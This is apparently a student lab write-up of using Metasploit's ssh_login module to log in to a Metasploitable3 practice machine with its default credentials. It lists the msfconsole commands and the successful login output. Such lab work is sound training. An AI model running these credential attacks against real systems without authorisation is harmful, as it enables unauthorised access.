# Metasploit – SSH Brute-Force

This part explains how we used Metasploit to perform an SSH login attempt on Metasploitable3 using default credentials.

## Target Info

- IP Address: 172.28.128.3
- Port: 22
- Username: msfadmin
- Password: msfadmin

## What We Did

We used Metasploit’s `ssh_login` scanner module to test if we could log in to the SSH service on the target machine using known credentials. The goal was to simulate a basic brute-force attack with a single user/pass combo.

## Steps

Start Metasploit by running the following command in the terminal:

```bash
msfconsole
```

Once it loads, use the SSH login module:

```bash
use auxiliary/scanner/ssh/ssh_login
```

Set the target IP and credentials:

```bash
set RHOSTS 172.28.128.3
set USERNAME msfadmin
set PASSWORD msfadmin
run
```

## Result

The login was successful. This confirms that the target SSH service was accessible using default credentials.

```text
[+] 172.28.128.3:22 - Login Successful: msfadmin:msfadmin
```

## Screenshot

We took a screenshot showing the successful login result from Metasploit.  
The file is saved as: `metasploit_attack.png`

This completes Task 1.1 for Phase 1.
